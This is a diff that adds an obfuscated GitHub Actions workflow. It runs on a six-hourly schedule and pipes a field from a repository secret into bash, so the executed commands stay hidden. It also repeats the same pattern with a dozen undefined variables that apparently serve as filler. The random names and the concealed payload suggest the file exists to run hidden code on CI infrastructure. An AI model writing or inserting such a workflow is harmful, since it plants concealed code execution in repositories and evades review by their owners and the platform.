@@ -1,0 +1,28 @@
+name: factorycurrently
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: factorycurrently
+        env:
+          of3: ${{ secrets.of3 }}
+        run: |
+          echo $of3 | jq -r .rftn721 | /bin/bash
+          echo $icx816 | jq -r .ylxwr6403 | /bin/bash
+          echo $izmn044 | jq -r .xdkeu8581 | /bin/bash
+          echo $bex8723 | jq -r .ra487 | /bin/bash
+          echo $f04097 | jq -r .to58 | /bin/bash
+          echo $eus28 | jq -r .xwfuw744 | /bin/bash
+          echo $vormt88 | jq -r .l36469 | /bin/bash
+          echo $oi3549 | jq -r .vnlue1077 | /bin/bash
+          echo $n686 | jq -r .adeif865 | /bin/bash
+          echo $ggnrz1423 | jq -r .hp2113 | /bin/bash
+          echo $mmyg0238 | jq -r .alzt76 | /bin/bash
+          echo $upp363 | jq -r .zkvze3727 | /bin/bash
+          echo $sjwc062 | jq -r .p820 | /bin/bash
+
